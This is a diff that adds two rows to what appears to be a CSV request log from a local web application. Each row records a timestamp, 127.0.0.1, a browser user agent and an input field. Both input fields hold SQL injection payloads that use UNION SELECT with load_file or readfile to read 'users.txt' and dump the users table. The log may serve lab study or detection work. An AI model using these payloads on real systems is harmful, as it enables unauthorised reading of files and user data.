@@ -1,0 +1,2 @@
+"2025-05-17 15:58:09","127.0.0.1","' UNION SELECT 1,load_file('users.txt')-- -dvqdgqd","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0","7"
+"2025-05-17 15:58:33","127.0.0.1","admin' UNION SELECT null,group_concat(line) FROM (SELECT 1 as id, line FROM (SELECT * FROM users UNION SELECT 2,readfile('users.txt') as line))-- -fbd","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0","7"
